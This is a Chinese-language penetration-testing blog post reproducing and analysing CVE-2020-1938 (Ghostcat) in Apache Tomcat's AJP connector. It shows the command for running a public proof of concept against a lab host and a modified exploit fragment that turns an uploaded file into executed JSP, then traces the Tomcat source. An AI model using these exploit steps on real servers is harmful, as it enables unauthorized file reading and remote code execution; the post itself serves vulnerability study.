---
title: CVE-2020-1938
date: 2023-09-03T15:29:52+08:00
updated: 2023-07-27T00:29:53+08:00
categories: 
- 渗透测试
- 漏洞复现
- Tomcat
---

## CVE-2020-1938

**漏洞描述：**

由于 Tomcat AJP 协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector 可以读取或包含 Tomcat 上所有 webapp 目录下的任意文件，例如可以读取 webapp 配置文件或源代码。此外在目标应用有文件上传功能的情况下，配合文件包含的利用还可以达到远程代码执行的危害。

**影响范围：**

Apache Tomcat 9.x < 9.0.31

Apache Tomcat 8.x < 8.5.51

Apache Tomcat 7.x < 7.0.100

Apache Tomcat 6.x

**利用条件：**

处在漏洞影响版本范围内的 Tomcat ，开启 AJP Connector 且攻击者能够访问 AJP Connector 服务端口的情况下

Tomcat AJP Connector 默认配置下即为开启状态，且监听在 0.0.0.0:8009

**漏洞成因：**

Tomcat Connector 是 Tomcat 与外部连接的通道，它使得 Catalina 能够接收来自外部的请求，传递给对应的 Web 应用程序处理，并返回请求的响应结果。

默认情况下，Tomcat 配置了两个 Connector，分别是 HTTP Connector 和 AJP Connector：

```
HTTP Connector：用于处理 HTTP 协议的请求（HTTP/1.1），默认监听地址为 0.0.0.0:8080

AJP Connector：用于处理 AJP 协议的请求（AJP/1.3），默认监听地址为 0.0.0.0:8009
```

AJP 是 Apache Tomcat Web 服务器使用的二进制协议，用于使用 TCP 连接与位于 Web 服务器后面的 servlet 容器进行通信。它主要用于集群或反向代理方案，其中 Web 服务器与应用程序服务器或 servlet 容器进行通信

AJP Connector同样监听在外网，由于Tomcat AJP协议存在缺陷而导致，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp下的任意文件以及可以包含任意文件

### 漏洞复现

从网上下载poc

https://github.com/Hancheng-Lei/Hacking-Vulnerability-CVE-2020-1938-Ghostcat/blob/main/CVE-2020-1938.md

```
python2 CVE-2020-1938.py 192.168.121.140 -p 8009 -f index.html
```

即可读取到index.html的内容

![2020-1938](E:\笔记软件\笔记\渗透测试\vulhub-CVE复现\2020-1938.png)

**文件包含**

利用文件包含漏洞，可以直接更改python脚本中的payload

```python
import argparse
parser = argparse.ArgumentParser()
parser.add_argument("target", type=str, help="Hostname or IP to attack")
parser.add_argument('-p', '--port', type=int, default=8009, help="AJP port to attack (default is 8009)")
parser.add_argument("-f", '--file', type=str, default='WEB-INF/web.xml', help="file path :(WEB-INF/web.xml)")
args = parser.parse_args()
t = Tomcat(args.target, args.port)
_,data = t.perform_request('/asdf(.jsp)',attributes=[
    #{'name':'req_attribute','value':['javax.servlet.include.request_uri','/']},
    #{'name':'req_attribute','value':['javax.servlet.include.path_info',args.file]},
    #{'name':'req_attribute','value':['javax.servlet.include.servlet_path','/']},
    {'name':'req_attribute','value':['org.apache.catalina.jsp_file','/test.png']}
    ])
print('----------------------------')
print("".join([d.data for d in data]))
```

利用该代码将test.png解析为jsp代码，需要注意的是，如果请求地址为asdf.jsp，web目录下不能存在asdf.jsp

### 漏洞分析

**文件读取**

 tomcat 处理文件的Defaultservlet在 url-pattern 设置了接受所有 URL 请求,txt,jpg,jsp由JspServlet处理

当我们向Tomcat发送AJP请求时，请求会被`org.apache.coyote.ajp.AjpProcessor`，`AjpProcessor`调用`prepareRequest`方法读取AJP请求中的信息来设置request属性

```
javax.servlet.include.request_uri
javax.servlet.include.path_info
javax.servlet.include.servlet_path
```

也就是读取文件所控制得三个请求，当通过AJP进行读取文件操作时，DfaultServlet会调用doGet方法，doGet调用ServeResource方法对文件资源进行操作，ServeRsource调用getResource进行文件资源的读取

```java
 WebResource resource = resources.getResource(path);
```

关键在于getRelativePath()

```java
if (request.getAttribute(RequestDispatcher.INCLUDE_REQUEST_URI) != null) {
            // For includes, get the info from the attributes
            pathInfo = (String) request.getAttribute(RequestDispatcher.INCLUDE_PATH_INFO);
            servletPath = (String) request.getAttribute(RequestDispatcher.INCLUDE_SERVLET_PATH);
```

由于脚本中设置的request_uri为/，并不为null,因此可以控制pathInfo和servletPath达到我们读取文件的目的，但是禁止使用../等进行跳遍历读文件的操作，因为DefaultServlet中对目录的限制，当检测到../会直接返回error

**文件包含**

文件包含是由于JspServlet造成的，同样的发送AJP请求，由于添加.jsp得后缀，会进入JspServlet得判断，导致文件被当作jsp执行

根据可控的三个request

```java
RequestUri：/docs/test.jsp
javax.servlet.include.request_uri: /
javax.servlet.include.path_info: test.png
javax.servlet.include.servlet_path: /
```

test.png会被当做jsp代码执行

### 参考链接

http://b1ue.cn/archives/275.html

https://gv7.me/articles/2020/cve-2020-1938-tomcat-ajp-lfi/

https://www.chaitin.cn/zh/ghostcat